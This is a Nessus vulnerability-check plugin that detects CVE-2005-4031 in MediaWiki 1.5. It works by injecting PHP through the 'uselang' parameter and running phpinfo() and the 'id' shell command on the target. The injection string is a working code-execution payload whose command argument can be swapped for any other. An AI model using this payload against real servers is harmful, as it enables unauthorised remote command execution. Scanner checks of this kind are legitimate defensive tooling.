#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description) {
 script_id(20255);
 script_version("$Revision: 1.13 $");
 script_cve_id("CVE-2005-4031");
 script_bugtraq_id(15703);
 script_xref(name:"OSVDB", value:"21444");
 
 script_name(english:"MediaWiki Language Option eval() Function Arbitrary PHP Code Execution");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a set of PHP scripts that allow an
attacker to execute arbitrary commands the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running a version of MediaWiki 1.5 older
than version 1.5.3.  Due to improper sanitation of user-supplied
input, the installed version of MediaWiki allows an unauthenticated
remote attacker to execute arbitrary PHP and shell commands on the
remote host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?group_id=34373&release_id=375755" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MediaWiki 1.5.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 script_summary(english:"Attempts to execute phpinfo() remotely");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_dependencies("mediawiki_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


function cmd(loc, cmd)
{
 local_var req, res;
  req = http_get(item:loc + urlencode(unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/?=", 
str: '/index.php?uselang=tns extends LanguageUtf8 {
function getVariants() {
	return 0;
 }
}
'+ cmd + '
class foobar'), port:port);
  
  res = http_keepalive_send_recv(port:port, data:req);
  return res;
}


# Test an install.
install = get_kb_item(string("www/", port, "/mediawiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches)) {
  loc = matches[2];
  res = cmd(cmd:"phpinfo();", loc:loc);
  if ( "<title>phpinfo()</title>" >< res ) 
   {
     # Unix only 
     res = egrep(pattern:"uid=[0-9].*gid=[0-9].*", string:cmd(cmd:'echo `id`;', loc:loc));
     if ( res ) 
	{
	 report = "
It was possible to execute the 'id' command, which produces the following result :

" + res;
	}

     security_hole(port:port, extra:report);
   }


}
